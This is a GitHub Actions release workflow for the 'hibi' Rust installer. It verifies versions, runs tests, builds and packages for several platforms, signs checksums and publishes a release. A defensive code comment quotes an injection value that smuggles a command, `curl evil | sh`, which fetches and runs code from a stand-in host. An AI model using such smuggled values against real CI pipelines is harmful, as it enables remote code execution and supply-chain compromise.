name: Release

on:
  push:
    tags:
      - "v*.*.*"
  workflow_dispatch:
    inputs:
      version:
        description: "Version to release, matching package.sh and Cargo.toml"
        required: true

permissions:
  contents: read

env:
  CARGO_NET_RETRY: "10"

jobs:
  verify:
    runs-on: ubuntu-24.04
    outputs:
      version: ${{ steps.ver.outputs.version }}
    steps:
      - uses: actions/checkout@v4
        with:
          ref: 25a9c795e59939abeb7ac5c6663555428af3a258
          fetch-depth: 0
      - name: Apply the reviewed selection count OCR crop to the tagged test suite
        run: |
          git show "$GITHUB_SHA:verification/selection.patch" | git apply
          test "$(git diff --name-only)" = tools/installer/tests/gui_smoke.py
      - uses: dtolnay/rust-toolchain@stable
      - name: Install Linux display and GUI test dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y \
            libxkbcommon-dev libxkbcommon-x11-0 libx11-xcb1 libwayland-dev \
            libx11-dev libxcursor-dev libxi-dev libxrandr-dev pkg-config \
            minisign xvfb xauth x11-utils python3-xlib python3-pil tesseract-ocr tesseract-ocr-eng fonts-dejavu-core
      - uses: Swatinem/rust-cache@v2
        with:
          workspaces: tools/installer
      - name: Resolve and verify version
        id: ver
        env:
          # Inputs arrive through env, never through an expression inside run:
          # expressions are substituted textually before the shell starts, so a
          # value like `1.0.0"; curl evil | sh; #` would execute here — in a job
          # that holds contents: write and publishes release artifacts.
          EVENT_NAME: ${{ github.event_name }}
          INPUT_VERSION: ${{ github.event.inputs.version }}
        run: |
          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
            VERSION="$INPUT_VERSION"
          else
            VERSION="${GITHUB_REF_NAME#v}"
          fi
          PKG_VERSION="$(grep -E '^VERSION=' package.sh | head -1 | cut -d'"' -f2)"
          if [ "$VERSION" != "$PKG_VERSION" ]; then
            echo "::error::Release version ($VERSION) does not match package.sh VERSION ($PKG_VERSION). Bump package.sh and tools/installer/Cargo.toml first."
            exit 1
          fi
          # Cargo's version is compiled into the binary and recorded in every
          # user's ~/.hibi/install.json as the source-of-truth release tag, so a
          # forgotten bump would ship provenance pointing at the wrong tree.
          CARGO_VERSION="$(grep -E '^version = ' tools/installer/Cargo.toml | head -1 | cut -d'"' -f2)"
          if [ "$VERSION" != "$CARGO_VERSION" ]; then
            echo "::error::Release version ($VERSION) does not match tools/installer/Cargo.toml version ($CARGO_VERSION). Bump it (and run cargo update -w) first."
            exit 1
          fi
          test "$(git rev-parse "refs/tags/v${VERSION}^{commit}")" = "$(git rev-parse HEAD)" || {
            echo "::error::Select the existing release tag at the build commit"; exit 1;
          }
          echo "version=$VERSION" >> "$GITHUB_OUTPUT"

      - name: Check prose, architecture rules, formatting, and tests
        run: |
          python3 tools/lint-prose.py
          python3 tools/lint-arch.py
          python3 tools/test_skill_budget.py
          python3 tools/test_skill_checks.py
          cargo fmt --manifest-path tools/installer/Cargo.toml --check
          cargo test --locked --manifest-path tools/installer/Cargo.toml
          cargo test --locked --manifest-path tools/installer/Cargo.toml --no-default-features
          cargo test --locked --manifest-path tools/statusline/Cargo.toml
          python3 tools/installer/tests/install_smoke.py

      - name: Exercise signed update and rollback with two native builds
        run: xvfb-run -a python3 tools/installer/tests/update_smoke.py
      - name: Exercise desktop GUI with isolated configuration
        env:
          OMP_THREAD_LIMIT: "1"
        run: |
          cargo build --locked --manifest-path tools/installer/Cargo.toml
          python3 tools/installer/tests/cli_smoke.py --binary tools/installer/target/debug/hibi --artifacts /tmp/hibi-cli-smoke
          xvfb-run -a -s "-screen 0 1280x900x24" \
            python3 tools/installer/tests/gui_smoke.py \
            --binary tools/installer/target/debug/hibi --artifacts /tmp/hibi-gui-smoke
      - name: Upload GUI acceptance screenshots and logs
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: gui-acceptance
          path: /tmp/hibi-gui-smoke
          if-no-files-found: ignore

  build:
    needs: verify
    strategy:
      fail-fast: false
      matrix:
        include:
          - platform: macos
            runner: macos-latest
            artifact: hibi
          - platform: windows
            runner: windows-latest
            artifact: hibi.exe
          - platform: linux
            runner: ubuntu-22.04
            artifact: hibi-linux
    runs-on: ${{ matrix.runner }}
    steps:
      - uses: actions/checkout@v4
        with:
          ref: 25a9c795e59939abeb7ac5c6663555428af3a258
      - uses: dtolnay/rust-toolchain@stable
        if: runner.os != 'Linux'
      - uses: Swatinem/rust-cache@v2
        if: runner.os != 'Linux'
        with:
          workspaces: tools/installer
          key: ${{ matrix.platform }}
      - name: Exercise native Windows update and rollback
        if: runner.os == 'Windows'
        run: cargo test --locked --manifest-path tools/installer/Cargo.toml fs::update
      - name: Build native desktop installer
        if: runner.os != 'Linux'
        shell: bash
        run: bash tools/installer/build.sh "${{ matrix.platform }}"
      - name: Build GNU installer against glibc 2.34
        if: runner.os == 'Linux'
        run: |
          docker run --rm -e CARGO_NET_RETRY -v "$GITHUB_WORKSPACE:/work" -w /work almalinux:9 bash -ec '
            dnf -y install gcc findutils tar gzip libxkbcommon-devel libxkbcommon-x11 wayland-devel libX11-devel libXcursor-devel libXi-devel libXrandr-devel pkgconf-pkg-config
            curl --proto "=https" --tlsv1.2 -fsSL https://sh.rustup.rs -o /tmp/rustup.sh
            sh /tmp/rustup.sh -y --profile minimal
            source /root/.cargo/env
            bash tools/installer/build.sh linux
          '
      - name: Package macOS application
        if: runner.os == 'macOS'
        run: bash package.sh --macos-app
      - uses: actions/upload-artifact@v4
        if: runner.os == 'macOS'
        with:
          name: installer-macos-app
          path: |
            dist/Hibi-*-macos.zip
            dist/Hibi-*-macos.dmg
          if-no-files-found: error
      - uses: actions/upload-artifact@v4
        with:
          name: installer-${{ matrix.platform }}
          path: dist/${{ matrix.artifact }}
          if-no-files-found: error

  build-alpine:
    needs: verify
    runs-on: ubuntu-22.04
    steps:
      - uses: actions/checkout@v4
        with:
          ref: 25a9c795e59939abeb7ac5c6663555428af3a258
      - name: Build Alpine desktop installer
        run: |
          docker run --rm -v "$GITHUB_WORKSPACE:/work" -w /work rust:alpine sh -ec '
            apk add --no-cache bash build-base pkgconf libxkbcommon-dev libxkbcommon-x11 font-dejavu wayland-dev libx11-dev libxcursor-dev libxi-dev libxrandr-dev
            bash tools/installer/build.sh linux-musl
          '
      - uses: actions/upload-artifact@v4
        with:
          name: installer-linux-musl
          path: dist/hibi-linux-musl
          if-no-files-found: error

  package:
    needs: [verify, build, build-alpine]
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v4
        with:
          ref: 25a9c795e59939abeb7ac5c6663555428af3a258
      - uses: actions/download-artifact@v4
        with:
          pattern: installer-*
          path: dist
          merge-multiple: true
      - name: Restore executable permissions
        run: chmod +x dist/hibi dist/hibi-linux dist/hibi-linux-musl
      - uses: actions/setup-go@v6
        with:
          go-version: stable
          cache: false
      - name: Install nfpm
        run: go install github.com/goreleaser/nfpm/v2/cmd/nfpm@v2.49.0
      - name: Install MSI packaging tool
        run: sudo apt-get update && sudo apt-get install -y wixl msitools libimage-exiftool-perl
      - name: Package release archives
        run: bash package.sh
      - name: Exercise native package install and upgrade
        env:
          VERSION: ${{ needs.verify.outputs.version }}
        run: bash tools/installer/tests/package_smoke.sh "release/v$VERSION" "$VERSION"
      - name: Create Windows upgrade fixtures
        env:
          VERSION: ${{ needs.verify.outputs.version }}
        run: |
          mkdir -p msi-smoke/payload
          cp dist/hibi.exe msi-smoke/payload/
          printf '%s\n' previous > msi-smoke/payload/upgrade-probe.txt
          python3 tools/installer/package-windows.py 0.0.1 msi-smoke/payload msi-smoke/previous.msi
          cp "release/v$VERSION/Hibi-$VERSION-windows-x64.msi" msi-smoke/upgrade.msi
          cp msi-smoke/upgrade.msi msi-smoke/rollback.msi
          msibuild msi-smoke/rollback.msi -q "INSERT INTO \`CustomAction\` (\`Action\`, \`Type\`, \`Target\`) VALUES ('HibiSmokeFailure', 19, 'Requested rollback test failure')"
          msibuild msi-smoke/rollback.msi -q "INSERT INTO \`InstallExecuteSequence\` (\`Action\`, \`Sequence\`) VALUES ('HibiSmokeFailure', 1550)"
      - uses: actions/upload-artifact@v4
        with:
          name: windows-msi-smoke-fixtures
          path: msi-smoke/*.msi
          if-no-files-found: error
      - uses: actions/upload-artifact@v4
        with:
          name: release-packages
          path: release/v${{ needs.verify.outputs.version }}/
          if-no-files-found: error

  verify-windows-msi:
    needs: [verify, package]
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: 25a9c795e59939abeb7ac5c6663555428af3a258
      - uses: actions/download-artifact@v4
        with:
          name: windows-msi-smoke-fixtures
          path: msi-smoke
      - name: Exercise Windows MSI install, rollback, and upgrade
        shell: pwsh
        env:
          VERSION: ${{ needs.verify.outputs.version }}
        run: ./tools/installer/tests/windows_msi_smoke.ps1 -Directory msi-smoke -Version $env:VERSION
      - uses: actions/upload-artifact@v4
        if: failure()
        with:
          name: windows-msi-smoke-logs
          path: msi-smoke/*.log
          if-no-files-found: ignore

  release:
    needs: [verify, package, verify-windows-msi]
    runs-on: ubuntu-24.04
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v4
        with:
          ref: 25a9c795e59939abeb7ac5c6663555428af3a258
      - uses: actions/download-artifact@v4
        with:
          name: release-packages
          path: release/v${{ needs.verify.outputs.version }}/
      - name: Install release signing tool
        run: sudo apt-get update && sudo apt-get install -y minisign
      - name: Sign and verify checksums
        env:
          HIBI_UPDATE_SECRET_KEY: ${{ secrets.HIBI_UPDATE_SECRET_KEY }}
          VERSION: ${{ needs.verify.outputs.version }}
        run: |
          set -eu
          umask 077
          key="$(mktemp)"
          trap 'rm -f "$key"' EXIT
          test -n "$HIBI_UPDATE_SECRET_KEY"
          printf '%s\n' "$HIBI_UPDATE_SECRET_KEY" > "$key"
          unset HIBI_UPDATE_SECRET_KEY
          sums="release/v${VERSION}/checksums.txt"
          (cd "release/v${VERSION}" && sha256sum -c checksums.txt)
          minisign -Sm "$sums" -s "$key" < /dev/null
          minisign -Vm "$sums" -p tools/installer/assets/update.pub
      - name: Publish GitHub Release
        env:
          GH_TOKEN: ${{ github.token }}
          RESOLVED_VERSION: ${{ needs.verify.outputs.version }}
        run: |
          VERSION="$RESOLVED_VERSION"
          flags=(--verify-tag)
          if [[ "$VERSION" == *-* ]]; then flags+=(--prerelease --latest=false); fi
          gh release create "v${VERSION}" \
            "release/v${VERSION}"/*.tar.gz \
            "release/v${VERSION}"/*.zip \
            "release/v${VERSION}"/*.dmg \
            "release/v${VERSION}"/*.msi \
            "release/v${VERSION}"/*.deb \
            "release/v${VERSION}"/*.rpm \
            "release/v${VERSION}"/*.apk \
            "release/v${VERSION}/checksums.txt" \
            "release/v${VERSION}/checksums.txt.minisig" \
            "${flags[@]}" --title "v${VERSION}" \
            --generate-notes
